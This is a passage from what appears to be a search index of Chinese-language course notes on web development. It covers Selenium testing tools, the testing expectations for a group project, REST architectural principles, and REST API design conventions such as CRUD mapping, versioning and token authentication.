<li>\u4f18\u70b9\uff1a\u6613\u4e8e\u8bb0\u5f55\u548c\u91cd\u64ad\uff0c\u53ef\u7528\u4e8e\u5feb\u901f\u539f\u578b\u6d4b\u8bd5\u548c\u521b\u5efa bug \u590d\u73b0\u62a5\u544a\u3002</li> <li>\u7f3a\u70b9\uff1a\u7ef4\u62a4\u56f0\u96be\uff08\u9875\u9762\u66f4\u6539\u9700\u8981\u91cd\u65b0\u8bb0\u5f55\uff09\uff0c\u96be\u4ee5\u5e94\u7528\u6d4b\u8bd5\u5939\u5177 (<code>setUp</code>/<code>tearDown</code>)\uff0c\u9700\u8981\u8fd0\u884c\u4e2d\u7684\u6d4f\u89c8\u5668\u5b9e\u4f8b\u3002</li> <li>\u5c0f\u7ec4\u9879\u76ee\u4e2d\u4e0d\u671f\u671b\u4f7f\u7528 <code>SeleniumIDE</code>\u3002</li> </ul> </li> <li><code>Selenium WebDriver</code>\uff1a\u63d0\u4f9b\u4e00\u7ec4\u5de5\u5177\uff08\u5982 Python \u7c7b\uff09\u6765\u7f16\u5199\u7cfb\u7edf\u6d4b\u8bd5\u811a\u672c\uff0c\u4e0e\u6d4f\u89c8\u5668\u8fdb\u884c\u4ea4\u4e92\u3002<ul> <li>\u4f18\u70b9\uff1a\u5141\u8bb8\u7528\u4ee3\u7801\u7f16\u5199\u6d4f\u89c8\u5668\u6d4b\u8bd5\uff0c\u89e3\u51b3\u4e86 IDE \u7684\u7ef4\u62a4\u548c\u5939\u5177\u95ee\u9898\u3002\u53ef\u4ee5\u4e0e\u6d4f\u89c8\u5668\u8fdb\u884c\u4ea4\u4e92\uff08\u67e5\u627e\u5143\u7d20\u3001\u6267\u884c\u52a8\u4f5c\u5982\u70b9\u51fb\u3001\u8f93\u5165\u6587\u672c\u3001\u62d6\u653e\uff09\uff0c\u63d0\u53d6\u4fe1\u606f\uff0c\u5e76\u4e0e\u6807\u51c6\u65ad\u8a00\u5e93\u7ed3\u5408\u3002</li> <li><code>SetUp</code> \u548c <code>tearDown</code> \u65b9\u6cd5\u4e0e\u5355\u5143\u6d4b\u8bd5\u7c7b\u4f3c\uff0c\u4f46\u9700\u8981\u542f\u52a8\u670d\u52a1\u5668\u7ebf\u7a0b\u5e76\u521d\u59cb\u5316 <code>webdriver</code>\u3002\u53ef\u4ee5\u5728\u65e0\u5934\u6a21\u5f0f (<code>headless mode</code>) \u4e0b\u8fd0\u884c\u6d4b\u8bd5\uff0c\u65e0\u9700\u521b\u5efa\u6d4f\u89c8\u5668\u7a97\u53e3.</li> <li>\u5c0f\u7ec4\u9879\u76ee\u4e2d\u671f\u671b\u6709\u826f\u597d\u7684 <code>Selenium WebDriver</code> \u6d4b\u8bd5\u9009\u62e9\u3002</li> </ul> </li> </ul>"},{"location":"cs/mern/3403/l13/#expectations-for-the-project","title":"Expectations for the Project","text":"<p>\u6839\u636e\u8bfe\u7a0b\u8981\u6c42\u548c\u6e90\u6750\u6599\uff0c\u5728\u5c0f\u7ec4\u9879\u76ee\u4e2d\uff0c\u5bf9\u4e8e\u6d4b\u8bd5\u7684\u671f\u671b\u5305\u62ec\uff1a</p> <ul> <li>\u62e5\u6709\u826f\u597d\u9009\u62e9\u7684 <code>Unit tests</code>\u3002</li> <li>\u62e5\u6709\u826f\u597d\u9009\u62e9\u7684 <code>Selenium WebDriver</code> \u6d4b\u8bd5\u3002</li> <li>\u671f\u671b\u80fd\u591f\u9605\u8bfb\u3001\u8bc4\u5224\u548c\u4fee\u590d\u57fa\u672c\u7684\u6d4b\u8bd5\u4ee3\u7801\uff0c\u7279\u522b\u662f\u4f7f\u7528 <code>Python unittest</code> \u5305\u7f16\u5199\u7684\u4ee3\u7801 [User Query]\u3002\u867d\u7136\u6e90\u6750\u6599\u6ca1\u6709\u76f4\u63a5\u8bf4\u4e0d\u671f\u671b\u81ea\u5df1\u7f16\u5199\uff0c\u4f46\u9879\u76ee\u8981\u6c42\u4fa7\u91cd\u4e8e\u9009\u62e9\u548c\u7406\u89e3\u3002</li> <li>\u4e0d\u671f\u671b\u6709 <code>integration</code> \u6216 <code>acceptance tests</code>\u3002</li> <li>\u4e0d\u671f\u671b\u4f7f\u7528 <code>test-driven design</code>\u3002</li> <li>\u4e0d\u671f\u671b\u4f7f\u7528 <code>SeleniumIDE</code>\u3002</li> <li>\u4e0d\u671f\u671b\u81ea\u5df1\u521b\u5efa <code>mocks, fakes, stubs</code>\u3002</li> <li>\u4e0d\u671f\u671b\u4f7f\u7528 <code>coverage testing</code>\u3002</li> </ul> <p>\u6d4b\u8bd5\u662f\u5c0f\u7ec4\u9879\u76ee\u4e2d\u5bb9\u6613\u88ab\u5ffd\u89c6\u4f46\u5f88\u91cd\u8981\u7684\u90e8\u5206\uff0c\u5e94\u786e\u4fdd\u7f16\u5199\u8db3\u591f\u7684\u6d4b\u8bd5\u4ee5\u6ee1\u8db3\u8981\u6c42\u3002</p>"},{"location":"cs/mern/3403/l14/","title":"14.0 RESTful API","text":""},{"location":"cs/mern/3403/l14/#purpose-of-apis-in-web-services","title":"Purpose of APIs in Web Services","text":"<p>\u5728\u8bbe\u8ba1\u7f51\u7edc\u670d\u52a1\u65f6\uff0cAPI\uff08Application Programming Interface\uff0c\u5e94\u7528\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3\uff09\u7684\u76ee\u7684\u662f\u5c06\u5e94\u7528\u7a0b\u5e8f\u7684\u903b\u8f91\u548c\u6570\u636e\u7ed3\u6784\u4f5c\u4e3a\u670d\u52a1\u63d0\u4f9b\u7ed9\u5176\u4ed6\u5f00\u53d1\u8005\u3002\u8fd9\u5141\u8bb8\u4ed6\u4eec\u5c06\u8fd9\u4e9b\u529f\u80fd\u5d4c\u5165\u5230\u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u5e76\u5b9a\u5236\u7528\u6237\u754c\u9762\u3002API \u662f\u73b0\u4ee3\u7f51\u7edc\u5e94\u7528\u7684\u5173\u952e\u6784\u5efa\u6a21\u5757\u3002</p> <p>\u4f20\u7edf\u7684\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u5c06\u540e\u7aef\u903b\u8f91\u3001\u6570\u636e\u5b58\u50a8\u548c\u524d\u7aef\u56fe\u5f62\u7528\u6237\u754c\u9762\u7d27\u5bc6\u8026\u5408\u5728\u4e00\u8d77\u3002\u8fd9\u610f\u5473\u7740\u5982\u679c\u8981\u4e3a\u79fb\u52a8\u8bbe\u5907\uff08\u5982 iOS \u6216 Android\uff09\u6216\u5176\u4ed6\u65b9\u5f0f\u521b\u5efa\u5e94\u7528\u7a0b\u5e8f\u7248\u672c\uff0c\u5c31\u9700\u8981\u8fdb\u884c\u5927\u91cf\u7684\u91cd\u5efa\u5de5\u4f5c\u3002API \u7684\u51fa\u73b0\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5b83\u901a\u8fc7\u4f7f\u7528 HTTP \u8bf7\u6c42\u3001\u6807\u51c6\u5316\u683c\u5f0f\u548c\u6587\u6863\u5316\u7684\u54cd\u5e94\u7c7b\u578b\uff0c\u4f7f\u540e\u7aef\u80fd\u591f\u670d\u52a1\u4e8e\u591a\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u5ba2\u6237\u7aef\u3002</p> <p>\u4f8b\u5982\uff0cGoogle Maps API\u3001Dropbox API \u548c Facebook API \u90fd\u662f\u5e38\u89c1\u7684 API \u793a\u4f8b\u3002\u5b83\u4eec\u5141\u8bb8\u5f00\u53d1\u8005\u5728\u81ea\u5df1\u7684\u5e94\u7528\u4e2d\u96c6\u6210\u5730\u56fe\u3001\u6587\u4ef6\u5b58\u50a8\u6216\u793e\u4ea4\u5a92\u4f53\u4e92\u52a8\u7b49\u529f\u80fd\uff0c\u800c\u65e0\u9700\u4ece\u5934\u6784\u5efa\u8fd9\u4e9b\u590d\u6742\u7684\u7cfb\u7edf\u3002\u5728\u8bfe\u7a0b\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u5df2\u7ecf\u63a5\u89e6\u8fc7 API\uff0c\u6bd4\u5982\u7528\u4e8e\u4ece\u5916\u90e8\u670d\u52a1\u5668\u83b7\u53d6\u968f\u673a\u53ef\u7231\u52a8\u7269\u56fe\u7247\u7684 API\u3002\u6b64\u5916\uff0c\u5728\u8ba8\u8bba\u5ba2\u6237\u7aef\u6e32\u67d3\u65f6\uff0c\u5b9e\u9645\u4e0a\u9690\u542b\u5730\u63cf\u8ff0\u4e86\u4e00\u79cd\u79c1\u6709 API\uff0c\u670d\u52a1\u5668\u7528\u5b83\u4e0e\u524d\u7aef\uff08\u6d4f\u89c8\u5668\uff09\u901a\u4fe1\uff0c\u4ee5 JSON \u683c\u5f0f\u53d1\u9001\u6570\u636e\uff0c\u518d\u7531\u524d\u7aef\u751f\u6210 HTML\u3002</p> <p>\u603b\u4e4b\uff0cAPI \u5bf9\u4e8e\u7f51\u7edc\u7684\u5b9e\u9645\u8fd0\u884c\u81f3\u5173\u91cd\u8981\uff0c\u73b0\u4ee3\u7f51\u7ad9\u51e0\u4e4e\u90fd\u4f1a\u4f9d\u8d56\u5176\u4ed6\u670d\u52a1\u5668\u7684 API \u6765\u63d0\u4f9b\u529f\u80fd\uff0c\u4f8b\u5982\u4e0e\u901a\u5e38\u4f4d\u4e8e\u4e0d\u540c\u670d\u52a1\u5668\u4e0a\u7684\u6570\u636e\u5e93\u4ea4\u4e92\u3001\u6216\u4f7f\u7528\u7b2c\u4e09\u65b9\u670d\u52a1\u5904\u7406\u5e7f\u544a\u3001\u8ddf\u8e2a\u6216\u7528\u6237\u8d26\u6237\u7b49\u3002API \u672c\u8eab\u4e0d\u662f\u7269\u7406\u5b9e\u4f53\u6216\u7a0b\u5e8f\uff0c\u800c\u662f\u4e00\u5957\u5173\u4e8e\u5982\u4f55\u8bf7\u6c42\u6570\u636e\u548c\u683c\u5f0f\u5316\u54cd\u5e94\u7684\u6807\u51c6\u548c\u89c4\u5219\u3002</p>"},{"location":"cs/mern/3403/l14/#principles-of-rest-apis","title":"Principles of REST APIs","text":"<p>REpresentational State Transfer (REST) \u662f\u4e00\u79cd\u7f51\u7edc\u67b6\u6784\u98ce\u683c\uff0c\u63cf\u8ff0\u4e86\u4e0e\u57fa\u4e8e\u7f51\u7edc\u7684\u8d44\u6e90\u8fdb\u884c\u4ea4\u4e92\u7684\u65b9\u5f0f\u3002REST \u7531 Roy Thomas Fielding \u4e8e 2000 \u5e74\u5b9a\u4e49\u3002\u4ed6\u66fe\u662f HTTP \u534f\u8bae\u7684\u4e3b\u8981\u4f5c\u8005\u4e4b\u4e00\uff0c\u5176\u8bba\u6587\u65e8\u5728\u660e\u786e\u7f51\u7edc\u7684\u8bbe\u8ba1\u9009\u62e9\u3002</p> <p>Fielding \u63d0\u51fa\u4e86 REST \u7684\u516d\u4e2a\u9ad8\u7ea7\u522b\u7279\u6027\uff0c\u8fd9\u4e9b\u7279\u6027\u5e76\u975e\u5f3a\u5236\u6267\u884c\uff0c\u56e0\u6b64\u5f00\u53d1\u8005\u5bf9\u5176\u89e3\u91ca\u4e0d\u540c\uff1a</p> <ol> <li>Client-server: \u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7684\u89d2\u8272\u5e94\u660e\u786e\u533a\u5206\uff0c\u4f5c\u4e3a\u72ec\u7acb\u7684\u8fdb\u7a0b\u8fd0\u884c\uff0c\u5e76\u901a\u8fc7\u4f20\u8f93\u5c42\u8fdb\u884c\u901a\u4fe1\u3002\u5b9e\u9645\u4e0a\uff0c\u5b83\u4eec\u901a\u8fc7 HTTP \u63a5\u53e3\u8fdb\u884c\u901a\u4fe1\uff0c\u4f20\u8f93\u5c42\u662f TCP/IP\u3002</li> <li>Layered System: \u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4e0d\u9700\u8981\u76f4\u63a5\u94fe\u63a5\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e2d\u95f4\u8282\u70b9\uff08intermediate nodes\uff09\u8fdb\u884c\u901a\u4fe1\u3002\u5ba2\u6237\u7aef\u65e0\u9700\u533a\u5206\u5b9e\u9645\u670d\u52a1\u5668\u548c\u5145\u5f53\u4ee3\u7406\u7684\u4e2d\u95f4\u5c42\uff0c\u670d\u52a1\u5668\u4e5f\u65e0\u9700\u77e5\u9053\u662f\u5426\u76f4\u63a5\u4e0e\u5ba2\u6237\u7aef\u901a\u4fe1\u3002\u8fd9\u5c01\u88c5\u4e86\u63a5\u53e3\u7684\u62bd\u8c61\u6027\uff0c\u5e76\u901a\u8fc7\u4ee3\u7406\u670d\u52a1\u5668\u548c\u8d1f\u8f7d\u5747\u8861\u5668\u7b49\u673a\u5236\u5b9e\u73b0\u4e86\u7f51\u7edc\u670d\u52a1\u7684\u53ef\u6269\u5c55\u6027\u3002</li> <li>Cache: \u5141\u8bb8\u5ba2\u6237\u7aef\u6216\u4e2d\u95f4\u5c42\u7f13\u5b58\uff08cache\uff09\u8bf7\u6c42\u7684\u54cd\u5e94\uff0c\u5e76\u5728\u540e\u7eed\u8bf7\u6c42\u4e2d\u76f4\u63a5\u63d0\u4f9b\u7f13\u5b58\u5185\u5bb9\uff0c\u800c\u65e0\u9700\u6bcf\u6b21\u90fd\u56de\u5230\u670d\u52a1\u5668\u3002\u8fd9\u63d0\u9ad8\u4e86\u7f51\u7edc\u7684\u6548\u7387\u3002\u670d\u52a1\u5668\u9700\u8981\u6307\u5b9a\u54ea\u4e9b\u5185\u5bb9\u53ef\u7f13\u5b58\uff08\u9759\u6001/\u52a8\u6001\uff09\u4ee5\u53ca\u4f55\u65f6\u8fc7\u671f\u3002\u52a0\u5bc6\u5185\u5bb9\u901a\u5e38\u96be\u4ee5\u88ab\u4e2d\u95f4\u5c42\u7f13\u5b58\u3002\u6240\u6709\u7f51\u9875\u6d4f\u89c8\u5668\u90fd\u5b9e\u73b0\u4e86\u7f13\u5b58\uff0c\u4ee5\u907f\u514d\u91cd\u590d\u52a0\u8f7d\u76f8\u540c\u7684\u9759\u6001\u6587\u4ef6\uff08\u5982\u56fe\u50cf\u3001CSS \u6837\u5f0f\u8868\uff09\u3002</li> <li>Code on Demand (optional): \u670d\u52a1\u5668\u53ef\u4ee5\u5728\u54cd\u5e94\u4e2d\u63d0\u4f9b\u53ef\u6267\u884c\u4ee3\u7801\u7ed9\u5ba2\u6237\u7aef\u3002\u8fd9\u5728\u7f51\u9875\u6d4f\u89c8\u5668\u4e2d\u5f88\u5e38\u89c1\uff0c\u670d\u52a1\u5668\u63d0\u4f9b JavaScript \u4ee3\u7801\u5728\u5ba2\u6237\u7aef\u8fd0\u884c\u3002\u7136\u800c\uff0c\u7531\u4e8e\u7f3a\u4e4f\u901a\u7528\u7684\u53ef\u6267\u884c\u4ee3\u7801\u6807\u51c6\uff08\u5982 iOS \u4e0d\u6267\u884c JavaScript\uff09\uff0c\u6b64\u539f\u5219\u5728 REST API \u4e2d\u5e76\u672a\u771f\u6b63\u666e\u53ca\u3002</li> <li>Stateless: \u8fd9\u662f HTTP \u534f\u8bae\u7684\u5173\u952e\u5c5e\u6027\uff0c\u4e5f\u4e0e REST API \u7d27\u5bc6\u76f8\u5173\u3002\u670d\u52a1\u5668\u4e0d\u5e94\u4fdd\u7559\u4e4b\u524d\u4e8b\u52a1\u7684\u4efb\u4f55\u8bb0\u5fc6\u3002\u5ba2\u6237\u7aef\u53d1\u51fa\u7684\u6bcf\u4e2a\u8bf7\u6c42\u90fd\u5fc5\u987b\u5305\u542b\u8db3\u591f\u7684\u4fe1\u606f\uff0c\u4f9b\u670d\u52a1\u5668\u6ee1\u8db3\u8be5\u8bf7\u6c42\u3002\u8868\u793a\u6027\u7684\u72b6\u6001\u4f53\u73b0\u5728 URL \u6216\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u8def\u7531\u4e2d\uff0c\u5e76\u901a\u8fc7\u6bcf\u4e2a\u8bf7\u6c42\u53d1\u9001\u3002\u8fd9\u4f7f\u5f97\u670d\u52a1\u6613\u4e8e\u6269\u5c55\uff0c\u56e0\u4e3a\u8d1f\u8f7d\u5747\u8861\u5668\u53ef\u4ee5\u5c06\u4efb\u610f\u8bf7\u6c42\u5206\u6d3e\u7ed9\u4efb\u4f55\u670d\u52a1\u5668\uff0c\u5b83\u4eec\u4e4b\u95f4\u65e0\u9700\u901a\u4fe1\u3002\u5b9e\u9645\u4e0a\uff0c\u8bb8\u591a REST API \u4e3a\u4e86\u5b9e\u73b0\u4f1a\u8bdd\u7ba1\u7406\u4f1a\u8bb0\u5f55\u72b6\u6001\uff0c\u4f46\u8fd9\u901a\u5e38\u662f\u5c06\u72b6\u6001\u5b58\u50a8\u5728\u6570\u636e\u5e93\u7b49\u5916\u90e8\u5b58\u50a8\u4e2d\uff0c\u800c\u4e0d\u662f\u5b58\u50a8\u5728\u5904\u7406\u8bf7\u6c42\u7684\u5355\u4e2a\u670d\u52a1\u5668\u5b9e\u4f8b\u4e0a\u3002\u8bf7\u6c42\u672c\u8eab\u5bf9\u670d\u52a1\u5668\u5448\u73b0\u4e3a\u65e0\u72b6\u6001\uff0c\u4e0d\u4f9d\u8d56\u4e8e\u8be5\u5ba2\u6237\u7aef\u4e4b\u524d\u7684\u8bf7\u6c42\u3002</li> <li>Uniform Interface: REST \u6700\u91cd\u8981\u4e5f\u6700\u6a21\u7cca\u7684\u8981\u6c42\u662f\u5b58\u5728\u7edf\u4e00\u63a5\u53e3\uff0c\u8fd9\u6837\u5ba2\u6237\u7aef\u539f\u5219\u4e0a\u65e0\u9700\u9488\u5bf9\u7279\u5b9a\u670d\u52a1\u5668\u8fdb\u884c\u7279\u522b\u8bbe\u8ba1\u6765\u6d88\u8d39\u5176\u670d\u52a1\u3002\u7edf\u4e00\u63a5\u53e3\u5305\u542b\u56db\u4e2a\u65b9\u9762\uff1a<ul> <li>Unique resource identifiers (\u552f\u4e00\u8d44\u6e90\u6807\u8bc6\u7b26): \u6bcf\u4e2a\u8d44\u6e90\u90fd\u5e94\u8be5\u6709\u552f\u4e00\u7684\u6807\u8bc6\u7b26\uff0c\u5373 URL\u3002\u4f8b\u5982\uff0c\u8bbf\u95ee\u7279\u5b9a\u7528\u6237\u7684 URL \u53ef\u80fd\u662f <code>api/users/&lt;id&gt;</code>\u3002</li> <li>Resource representations (\u8d44\u6e90\u8868\u793a): \u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4ea4\u6362\u7684\u6570\u636e\u5e94\u8be5\u91c7\u7528\u7ea6\u5b9a\u7684\u683c\u5f0f\uff0c\u901a\u5e38\u662f JSON\u3002HTTP \u652f\u6301\u5185\u5bb9\u534f\u5546\uff0c\u5141\u8bb8\u5ba2\u6237\u7aef\u6307\u5b9a\u671f\u671b\u7684\u683c\u5f0f\u3002</li> <li>Self-descriptive messages (\u81ea\u63cf\u8ff0\u6d88\u606f): \u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\u5e94\u8be5\u6e05\u695a\u8868\u660e\u610f\u56fe\u6267\u884c\u7684\u64cd\u4f5c\u3002\u8fd9\u901a\u5e38\u901a\u8fc7\u7ed3\u5408 URL \u548c\u5177\u6709\u6e05\u6670\u8bed\u4e49\u7684 HTTP \u65b9\u6cd5\uff08\u5982 GET, POST, PUT, DELETE\uff09\u6765\u5b9e\u73b0\u3002</li> <li>Hypermedia links (\u8d85\u5a92\u4f53\u94fe\u63a5): \u5ba2\u6237\u7aef\u5e94\u8be5\u80fd\u591f\u901a\u8fc7\u8ddf\u968f\u54cd\u5e94\u4e2d\u63d0\u4f9b\u7684\u8d85\u94fe\u63a5\u6765\u53d1\u73b0\u65b0\u7684\u76f8\u5173\u8d44\u6e90\u3002\u4f8b\u5982\uff0c\u83b7\u53d6\u65b0\u95fb\u6587\u7ae0\u7684\u54cd\u5e94\u4e2d\u53ef\u80fd\u5305\u542b\u83b7\u53d6\u8be5\u6587\u7ae0\u8bc4\u8bba\u7684 URL \u5217\u8868\u3002</li> </ul> </li> </ol>"},{"location":"cs/mern/3403/l14/#standard-conventions-for-designing-rest-apis","title":"Standard Conventions for Designing REST APIs","text":"<p>\u8bbe\u8ba1 REST API \u65f6\uff0c\u6709\u4e00\u4e9b\u6807\u51c6\u7ea6\u5b9a\u548c\u826f\u597d\u5b9e\u8df5\u53ef\u9075\u5faa\uff1a</p> <ol> <li> <p>\u57fa\u4e8e CRUD \u64cd\u4f5c\u548c HTTP \u65b9\u6cd5: REST API \u901a\u5e38\u56f4\u7ed5 CRUD (Create, Read, Update, Delete) \u64cd\u4f5c\u8bbe\u8ba1\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u6620\u5c04\u5230\u6807\u51c6\u7684 HTTP \u65b9\u6cd5\uff1a</p> <ul> <li>CREATE: \u901a\u5e38\u6620\u5c04\u5230 POST \u65b9\u6cd5\u3002\u7528\u4e8e\u5728\u96c6\u5408\u4e2d\u521b\u5efa\u65b0\u8d44\u6e90\u3002</li> <li>READ: \u901a\u5e38\u6620\u5c04\u5230 GET \u65b9\u6cd5\u3002\u7528\u4e8e\u83b7\u53d6\u5355\u4e2a\u8d44\u6e90\u6216\u8d44\u6e90\u96c6\u5408\u3002</li> <li>UPDATE: \u901a\u5e38\u6620\u5c04\u5230 PUT \u6216 PATCH \u65b9\u6cd5\u3002PUT \u901a\u5e38\u7528\u4e8e\u5b8c\u5168\u66ff\u6362\u8d44\u6e90\uff0cPATCH \u7528\u4e8e\u90e8\u5206\u66f4\u65b0\u3002</li> <li>DELETE: \u6620\u5c04\u5230 DELETE \u65b9\u6cd5\u3002\u7528\u4e8e\u5220\u9664\u8d44\u6e90\u3002</li> </ul> </li> <li> <p>URL \u7ed3\u6784\u4e0e\u6570\u636e\u6a21\u578b\u5bf9\u5e94: REST API \u901a\u5e38\u4f1a\u4e3a\u6570\u636e\u5e93\u4e2d\u7684\u6bcf\u4e2a\u6a21\u578b\u6216\u6982\u5ff5\u8bbe\u8ba1\u5173\u8054\u7684 URL\u3002URL \u4e0e HTTP \u65b9\u6cd5\u7ed3\u5408\u65f6\uff0c\u5e94\u8be5\u81ea\u63cf\u8ff0\u6240\u6267\u884c\u7684\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c<code>/api/movies</code> \u53ef\u80fd\u4ee3\u8868\u7535\u5f71\u96c6\u5408\uff0c<code>/api/movies/{id}</code> \u4ee3\u8868\u5177\u6709\u7279\u5b9a ID \u7684\u7535\u5f71\u3002\u5e76\u975e\u6570\u636e\u5e93\u4e2d\u6240\u6709\u90e8\u5206\u90fd\u5e94\u901a\u8fc7 API \u516c\u5f00\uff0c\u7279\u522b\u662f\u654f\u611f\u6216\u9700\u8981\u7279\u5b9a\u6743\u9650\u7684\u6570\u636e\u3002\u5b89\u5168\u6027\u901a\u8fc7 API \u5bc6\u94a5\u6216\u8ba4\u8bc1\u6765\u5b9e\u73b0\u3002</p> </li> <li> <p>API \u6587\u6863: \u4e3a\u4e86\u8ba9\u5176\u4ed6\u5f00\u53d1\u8005\u4e86\u89e3\u548c\u4f7f\u7528\u4f60\u7684 API\uff0c\u5fc5\u987b\u63d0\u4f9b\u8be6\u7ec6\u7684\u6587\u6863\u3002\u6587\u6863\u5e94\u5305\u62ec\u6bcf\u4e2a URL \u7684\u5217\u8868\uff0c\u4ee5\u53ca\uff1a</p> <ul> <li>Purpose (\u76ee\u7684): \u8be5 URL \u7684\u7528\u9014\u3002</li> <li>Parameters (\u53c2\u6570): \u63a5\u53d7\u54ea\u4e9b\u53c2\u6570\u3002</li> <li>HTTP Methods Accepted (\u63a5\u53d7\u7684 HTTP \u65b9\u6cd5): \u652f\u6301\u54ea\u4e9b HTTP \u65b9\u6cd5\uff08GET, POST \u7b49\uff09\u3002</li> <li>Response Data (\u54cd\u5e94\u6570\u636e): \u8fd4\u56de\u4ec0\u4e48\u6570\u636e\uff0c\u5305\u62ec\u53ef\u80fd\u51fa\u73b0\u7684\u6807\u51c6\u9519\u8bef\u4ee3\u7801\u53ca\u5176\u542b\u4e49\u3002</li> <li>Format of the Response (\u54cd\u5e94\u683c\u5f0f): \u6570\u636e\u683c\u5f0f\uff0c\u4f8b\u5982 JSON\u3002</li> </ul> </li> <li> <p>\u826f\u597d\u5b9e\u8df5:</p> <ul> <li>Grouping related entities hierarchically (\u6309\u5c42\u7ea7\u5206\u7ec4\u76f8\u5173\u5b9e\u4f53): URL \u7ed3\u6784\u5e94\u53cd\u6620\u6570\u636e\u4e4b\u95f4\u7684\u5c42\u7ea7\u5173\u7cfb\u3002\u4f8b\u5982\uff0c\u6587\u7ae0\u7684\u8bc4\u8bba\u53ef\u4ee5\u7ec4\u7ec7\u5728\u6587\u7ae0 URL \u4e0b\uff0c\u5982 <code>articles/{article_id}/comments</code>\u3002\u8fd9\u5141\u8bb8\u5ba2\u6237\u7aef\u53ea\u52a0\u8f7d\u9700\u8981\u7684\u6700\u5c11\u6570\u636e\uff0c\u4f8b\u5982\u53ea\u52a0\u8f7d\u6587\u7ae0\u6807\u9898\u800c\u4e0d\u540c\u65f6\u52a0\u8f7d\u6240\u6709\u8bc4\u8bba\u3002</li> <li>Allowing pagination, sorting and filtering (\u652f\u6301\u5206\u9875\u3001\u6392\u5e8f\u548c\u8fc7\u6ee4): \u5bf9\u4e8e\u5927\u578b\u96c6\u5408\uff08\u5982\u7535\u5f71\u5217\u8868\uff09\uff0cAPI \u5e94\u8be5\u652f\u6301\u5206\u9875\uff08pagination\uff09\u4ee5\u5206\u5757\u52a0\u8f7d\u6570\u636e\uff0c\u907f\u514d\u4e00\u6b21\u4f20\u8f93\u8fc7\u591a\u6570\u636e\u5bfc\u81f4\u52a0\u8f7d\u7f13\u6162\u548c\u5e26\u5bbd\u95ee\u9898\u3002\u670d\u52a1\u5668\u5e94\u5904\u7406\u6392\u5e8f\uff08sorting\uff09\u548c\u8fc7\u6ee4\uff08filtering\uff09\u64cd\u4f5c\uff0c\u56e0\u4e3a\u5ba2\u6237\u7aef\u53ef\u80fd\u6ca1\u6709\u5b8c\u6574\u7684\u6570\u636e\u96c6\u6765\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\u3002</li> <li>Versioning the API (\u7248\u672c\u63a7\u5236 API): \u7531\u4e8e API \u662f\u516c\u5f00\u8d44\u6e90\uff0c\u5bf9\u5176\u8fdb\u884c\u66f4\u6539\u53ef\u80fd\u4f1a\u7834\u574f\u73b0\u6709\u4f7f\u7528\u8005\u3002\u5e94\u901a\u8fc7\u5728 URL \u524d\u6dfb\u52a0\u7248\u672c\u53f7\uff08\u5982 <code>v1/articles</code>\uff09\u6216\u5728\u8bf7\u6c42\u5934\u4e2d\u6307\u5b9a\u7248\u672c\u6765\u7ba1\u7406 API \u7248\u672c\u3002\u901a\u5e38\u9700\u8981\u540c\u65f6\u652f\u6301\u591a\u4e2a\u65e7\u7248\u672c\u4e00\u6bb5\u65f6\u95f4\uff0c\u4ee5\u4fbf\u7528\u6237\u8fc1\u79fb\u3002</li> <li>Use standard error codes (\u4f7f\u7528\u6807\u51c6\u9519\u8bef\u4ee3\u7801): \u5229\u7528\u6807\u51c6\u7684 HTTP \u72b6\u6001\u7801\uff08\u5982 200 OK, 201 Created, 400 Bad Request, 404 Not Found, 500 Internal Server Error\uff09\u6765\u8868\u793a\u64cd\u4f5c\u7ed3\u679c\u548c\u9519\u8bef\u3002\u907f\u514d\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\u7801\uff0c\u8fd9\u6709\u52a9\u4e8e\u4e0e\u73b0\u6709\u5e93\u548c\u5de5\u5177\u96c6\u6210\u3002</li> <li>JSON Structure: API \u8bf7\u6c42\u548c\u54cd\u5e94\u901a\u5e38\u4f7f\u7528 JSON \u683c\u5f0f\u4f20\u8f93\u6570\u636e\u3002\u670d\u52a1\u5668\u7aef\uff08\u5982 Flask\uff09\u53ef\u4ee5\u63d0\u4f9b\u5c06 Python \u5b57\u5178\u8f6c\u6362\u4e3a JSON \u54cd\u5e94\u7684\u65b9\u6cd5\uff08\u5982 <code>jsonify</code>\uff09\u3002\u6570\u636e\u6a21\u578b\u53ef\u4ee5\u5305\u542b\u65b9\u6cd5\u6765\u65b9\u4fbf\u5730\u8f6c\u6362\u4e3a\u5b57\u5178\u6216\u4ece\u5b57\u5178\u52a0\u8f7d\u6570\u636e\u3002</li> <li>Token-based Authentication: \u5bf9\u4e8e\u9700\u8981\u6388\u6743\u7684 API\uff0c\u5e38\u4f7f\u7528\u4ee4\u724c\uff08token\uff09\u8fdb\u884c\u8bbf\u95ee\u63a7\u5236\u3002\u767b\u5f55\u7528\u6237\u53ef\u4ee5\u751f\u6210\u4ee4\u724c\uff0c\u5e76\u5728\u540e\u7eed\u8bf7\u6c42\u4e2d\u643a\u5e26\u4ee4\u724c\u4ee5\u8bc1\u660e\u5176\u6709\u6743\u8bbf\u95ee API\u3002\u4ee4\u724c\u4e0d\u4e00\u5b9a\u552f\u4e00\u6807\u8bc6\u7528\u6237\uff0c\u4f46\u8868\u793a\u5176\u5177\u6709\u6267\u884c\u64cd\u4f5c\u7684\u6743\u9650\u3002API \u5bc6\u94a5\u662f\u4ee4\u724c\u7684\u4e00\u79cd\u5f62\u5f0f\u3002\u4ee4\u724c\u53ef\u4ee5\u7528\u4e8e\u901f\u7387\u9650\u5236\uff0c\u9632\u6b62\u6ee5\u7528\u548c\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002</li> </ul> </li> </ol> <p>GitHub API \u662f\u4e00\u4e2a\u8be6\u7ec6\u7684 REST API 